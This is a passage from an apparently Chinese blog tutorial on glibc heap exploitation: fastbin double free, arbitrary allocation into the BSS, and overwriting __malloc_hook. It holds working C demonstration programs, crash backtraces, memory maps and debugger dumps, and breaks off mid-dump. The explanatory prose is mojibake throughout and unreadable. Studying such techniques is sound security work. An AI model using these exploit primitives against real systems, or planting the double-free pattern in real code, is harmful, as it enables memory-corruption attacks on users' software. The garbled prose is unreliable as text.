Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]<br>/lib/x86_64-linux-gnu/libc.so.6(+0x<span class="hljs-number">8037</span>a)[0x7fbb7a<span class="hljs-number">3753</span>7a]<br>/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a<span class="hljs-number">3795</span>3c]<br>./tst[0x<span class="hljs-number">4005</span>a2]<br>/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a<span class="hljs-number">315830</span>]<br>./tst[0x<span class="hljs-number">400499</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000-004010</span>00 r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00600000-006010</span>00 r--p <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00601000-006020</span>00 rw-p <span class="hljs-number">00001000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">02200000-022210</span>00 rw-p <span class="hljs-number">00000000</span> 00:00 0                                  [heap]<br>7fbb<span class="hljs-number">74000000</span>-7fbb<span class="hljs-number">74021000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb<span class="hljs-number">74021000</span>-7fbb<span class="hljs-number">78000000</span> ---p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a0df000-7fbb7a0f<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a0f<span class="hljs-number">5000</span>-7fbb7a2f<span class="hljs-number">4000</span> ---p <span class="hljs-number">00016000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a2f<span class="hljs-number">4000</span>-7fbb7a2f<span class="hljs-number">5000</span> rw-p <span class="hljs-number">00015000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a2f<span class="hljs-number">5000</span>-7fbb7a4b<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a4b<span class="hljs-number">5000</span>-7fbb7a6b<span class="hljs-number">5000</span> ---p 001c<span class="hljs-number">0000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6b<span class="hljs-number">5000</span>-7fbb7a6b<span class="hljs-number">9000</span> r--p 001c<span class="hljs-number">0000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6b<span class="hljs-number">9000</span>-7fbb7a6bb000 rw-p 001c<span class="hljs-number">4000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6bb000-7fbb7a6bf000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a6bf000-7fbb7a6e<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8c<span class="hljs-number">7000</span>-7fbb7a8ca000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a8e<span class="hljs-number">1000</span>-7fbb7a8e<span class="hljs-number">4000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a8e<span class="hljs-number">4000</span>-7fbb7a8e<span class="hljs-number">5000</span> r--p <span class="hljs-number">00025000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8e<span class="hljs-number">5000</span>-7fbb7a8e<span class="hljs-number">6000</span> rw-p <span class="hljs-number">00026000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8e<span class="hljs-number">6000</span>-7fbb7a8e<span class="hljs-number">7000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7ffcd2f<span class="hljs-number">9300</span>0-7ffcd2fb<span class="hljs-number">4000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0                          [stack]<br>7ffcd2fc<span class="hljs-number">8000</span>-7ffcd2fca000 r--p <span class="hljs-number">00000000</span> 00:00 0                          [vvar]<br>7ffcd2fca000-7ffcd2fcc000 r-xp <span class="hljs-number">00000000</span> 00:00 0                          [vdso]<br>ffffffffff<span class="hljs-number">600000</span>-ffffffffff<span class="hljs-number">601000</span> r-xp <span class="hljs-number">00000000</span> 00:00 0                  [vsyscall]<br>å·²æ”¾å¼ƒ (æ ¸å¿ƒå·²è½¬å‚¨)<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬åœ¨ chunk1 é‡Šæ”¾åï¼Œå†é‡Šæ”¾ chunk2 ï¼Œè¿™æ · main_arena å°±æŒ‡å‘ chunk2 è€Œä¸æ˜¯ chunk1 äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å†å»é‡Šæ”¾ chunk1 å°±ä¸å†ä¼šè¢«æ£€æµ‹åˆ°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡é‡Šæ”¾<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258336.png"></p><p>ç¬¬äºŒæ¬¡é‡Šæ”¾<code>free(chunk2)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258513.png"></p><p>ç¬¬ä¸‰æ¬¡é‡Šæ”¾<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258763.png"></p><p>æ³¨æ„å› ä¸º chunk1 è¢«å†æ¬¡é‡Šæ”¾å› æ­¤å…¶ fd å€¼ä¸å†ä¸º 0 è€Œæ˜¯æŒ‡å‘ chunk2ï¼Œè¿™æ—¶å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ chunk1 çš„å†…å®¹ï¼Œä¾¿å¯ä»¥å†™å…¥å…¶ fd æŒ‡é’ˆä»è€Œå®ç°åœ¨æˆ‘ä»¬æƒ³è¦çš„ä»»æ„åœ°å€åˆ†é… fastbin å—ã€‚ ä¸‹é¢è¿™ä¸ªç¤ºä¾‹æ¼”ç¤ºäº†è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆè·Ÿå‰é¢ä¸€æ ·æ„é€  main_arena&#x3D;&gt;chunk1&#x3D;&gt;chun2&#x3D;&gt;chunk1 çš„é“¾è¡¨ã€‚ä¹‹åç¬¬ä¸€æ¬¡è°ƒç”¨ malloc è¿”å› chunk1 ä¹‹åä¿®æ”¹ chunk1 çš„ fd æŒ‡é’ˆæŒ‡å‘ bss æ®µä¸Šçš„ bss_chunkï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ° fastbin ä¼šæŠŠå †å—åˆ†é…åˆ°è¿™é‡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> pre_size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fd;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-type">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æˆ‘çš„ç³»ç»Ÿä¸Š chunk_b è¾“å‡ºçš„å€¼ä¼šæ˜¯ 0x601090ï¼Œè¿™ä¸ªå€¼ä½äº bss æ®µä¸­æ­£æ˜¯æˆ‘ä»¬ä¹‹å‰è®¾ç½®çš„</p><p>CHUNK bss_chunk</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">CHUNK bss_chunk<br>Start              End                Offset             Perm Path<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000400000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000401000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> r-x /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000600000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000601000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> r-- /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000601000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000001000</span> rw- /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000623000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> rw- [heap]<br><br><span class="hljs-number">0x601080</span> &lt;bss_chunk&gt;:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x601090</span> &lt;bss_chunk+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010a0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010b0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010c0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨ main å‡½æ•°çš„ç¬¬ä¸€æ­¥å°±è¿›è¡Œäº†<code>bss_chunk.size=0x21;</code>çš„æ“ä½œï¼Œè¿™æ˜¯å› ä¸º_int_malloc ä¼šå¯¹æ¬²åˆ†é…ä½ç½®çš„ size åŸŸè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœå…¶ size ä¸å½“å‰ fastbin é“¾è¡¨åº”æœ‰ size ä¸ç¬¦å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dns">*** Error in `./tst&#x27;: malloc(): memory corruption (fast): <span class="hljs-number">0</span>x00000<span class="hljs-number">00000601090</span> ***<br>======= Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(+<span class="hljs-number">0x777e5</span>)[<span class="hljs-number">0</span>x7f8f9deb27e5]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(+<span class="hljs-number">0x82651</span>)[<span class="hljs-number">0</span>x7f8f9debd651]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(__libc_malloc+<span class="hljs-number">0</span>x54)[<span class="hljs-number">0</span>x7f8f9debf184]<br>./tst[<span class="hljs-number">0x400636</span>]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(__libc_start_main+<span class="hljs-number">0</span>xf0)[<span class="hljs-number">0</span>x7f8f9de5b830]<br>./tst[<span class="hljs-number">0x4004e9</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000</span>-<span class="hljs-number">00401000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00600000</span>-<span class="hljs-number">00601000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00601000</span>-<span class="hljs-number">00602000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00</span>bc4000-<span class="hljs-number">00</span>be5000 rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                                  [heap]<br><span class="hljs-number">7</span>f<span class="hljs-number">8f98000000</span>-<span class="hljs-number">7</span>f<span class="hljs-number">8f98021000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f<span class="hljs-number">8f98021000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9c000000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f9dc25000-<span class="hljs-number">7</span>f8f9dc3b000 r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9dc3b000-<span class="hljs-number">7</span>f8f9de3a000 ---p <span class="hljs-number">00016000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9de3a000-<span class="hljs-number">7</span>f8f9de3b000 rw-p <span class="hljs-number">00015000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9de3b000-<span class="hljs-number">7</span>f8f9dffb000 r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9dffb000-<span class="hljs-number">7</span>f8f9e1fb000 ---p <span class="hljs-number">001c0000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9e1fb000-<span class="hljs-number">7</span>f8f9e1ff000 r--p <span class="hljs-number">001c0000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9e1ff000-<span class="hljs-number">7</span>f<span class="hljs-number">8f9e201000</span> rw-p <span class="hljs-number">001c4000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f<span class="hljs-number">8f9e201000</span>-<span class="hljs-number">7</span>f<span class="hljs-number">8f9e205000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f<span class="hljs-number">8f9e205000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e22b000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e40d000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e410000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e427000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42a000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42a000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42b000</span> r--p <span class="hljs-number">00025000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42b000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42c000</span> rw-p <span class="hljs-number">00026000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42c000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42d000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>fff<span class="hljs-number">71a94000</span>-<span class="hljs-number">7</span>fff71ab5000 rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [stack]<br><span class="hljs-number">7</span>fff71bd9000-<span class="hljs-number">7</span>fff71bdb000 r--p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [vvar]<br><span class="hljs-number">7</span>fff71bdb000-<span class="hljs-number">7</span>fff71bdd000 r-xp <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [vdso]<br>ffffffffff600000-ffffffffff601000 r-xp <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                  [vsyscall]<br>å·²æ”¾å¼ƒ (æ ¸å¿ƒå·²è½¬å‚¨)<br></code></pre></td></tr></table></figure><p>_int_malloc ä¸­çš„æ ¡éªŒå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>    errout:<br>      malloc_printerr (check_action, errstr, chunk2mem (victim));<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>é€šè¿‡ fastbin double free æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªæŒ‡é’ˆæ§åˆ¶åŒä¸€ä¸ªå †å—ï¼Œè¿™å¯ä»¥ç”¨äºç¯¡æ”¹ä¸€äº›å †å—ä¸­çš„å…³é”®æ•°æ®åŸŸæˆ–è€…æ˜¯å®ç°ç±»ä¼¼äºç±»å‹æ··æ·†çš„æ•ˆæœã€‚ å¦‚æœæ›´è¿›ä¸€æ­¥ä¿®æ”¹ fd æŒ‡é’ˆï¼Œåˆ™èƒ½å¤Ÿå®ç°ä»»æ„åœ°å€åˆ†é…å †å—çš„æ•ˆæœ (é¦–å…ˆè¦é€šè¿‡éªŒè¯)ï¼Œè¿™å°±ç›¸å½“äºä»»æ„åœ°å€å†™ä»»æ„å€¼çš„æ•ˆæœã€‚</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>å¯ä»¥çœ‹è¿™ç¯‡<a href="https://tkymax.github.io/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/">åšå®¢</a></p><h2 id="Alloc-to-Stack-Arbitrary-Alloc"><a href="#Alloc-to-Stack-Arbitrary-Alloc" class="headerlink" title="Alloc to Stack &amp;&amp; Arbitrary Alloc"></a>Alloc to Stack &amp;&amp; Arbitrary Alloc</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å¯¹äºè¿™ä¸¤ä¸ªæŠ€æœ¯ï¼Œæˆ‘ä¸ªäººæ„Ÿè§‰ååˆ†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ç¯¡æ”¹fdæŒ‡é’ˆæŒ‡å‘ä¼ªé€ çš„chunkï¼Œè€Œç¬¬äºŒç§æŠ€æœ¯ç›¸å¯¹æ¥è¯´ï¼Œæ¶µç›–äº†ç¬¬ä¸€ç§ï¼Œæˆ‘ä»¬ç›´æ¥ç®€ç»ç¬¬äºŒç§</p><p>äº‹å®ä¸Šåªè¦æ»¡è¶³ç›®æ ‡åœ°å€å­˜åœ¨åˆæ³•çš„ size åŸŸï¼ˆè¿™ä¸ª size åŸŸæ˜¯æ„é€ çš„ï¼Œè¿˜æ˜¯è‡ªç„¶å­˜åœ¨çš„éƒ½æ— å¦¨ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ chunk åˆ†é…åˆ°ä»»æ„çš„å¯å†™å†…å­˜ä¸­ï¼Œæ¯”å¦‚ bssã€heapã€dataã€stack ç­‰ç­‰ã€‚</p><h3 id="æ¼”ç¤º-1"><a href="#æ¼”ç¤º-1" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><p>åœ¨è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä½¿ç”¨å­—èŠ‚é”™ä½æ¥å®ç°ç›´æ¥åˆ†é… fastbin åˆ°<strong>_malloc_hook çš„ä½ç½®ï¼Œç›¸å½“äºè¦†ç›–_malloc_hook æ¥æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><br><br>    <span class="hljs-type">void</span> *chunk1;<br>    <span class="hljs-type">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ 0x7ffff7dd1af5 æ˜¯æˆ‘æ ¹æ®æœ¬æœºçš„æƒ…å†µå¾—å‡ºçš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯æ€ä¹ˆè·å¾—çš„å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬è¦è§‚å¯Ÿæ¬²å†™å…¥åœ°å€é™„è¿‘æ˜¯å¦å­˜åœ¨å¯ä»¥å­—èŠ‚é”™ä½çš„æƒ…å†µã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1a88</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1a90</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1a98</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1aa0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1aa8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 